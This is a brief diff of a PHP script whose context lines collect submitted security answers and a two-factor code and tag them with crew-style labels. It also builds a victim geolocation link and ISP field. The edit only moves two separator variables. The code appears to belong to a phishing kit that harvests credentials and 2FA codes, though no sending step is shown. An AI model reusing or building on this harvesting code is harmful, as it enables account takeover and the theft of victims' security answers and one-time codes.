@@ -180,12 +180,11 @@ $answer5        = $_POST['answer5'];
     $code       = $_POST['code']; 
     $code2      ="[2FA][$code]";
     $logo       = "[S-T-R|CR00K]";
-    $gitusr     = "[SWIF-T-RYNX]";
+    $gitusr     = "[SWIF-T-RYNX]";	$lh     = "|";
     $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
     $isp        = $is;
     $currency   = "".$full_date;
-	$lh     = "|";
-        $li     = ",";
+    $li     = ",";
 
     
 
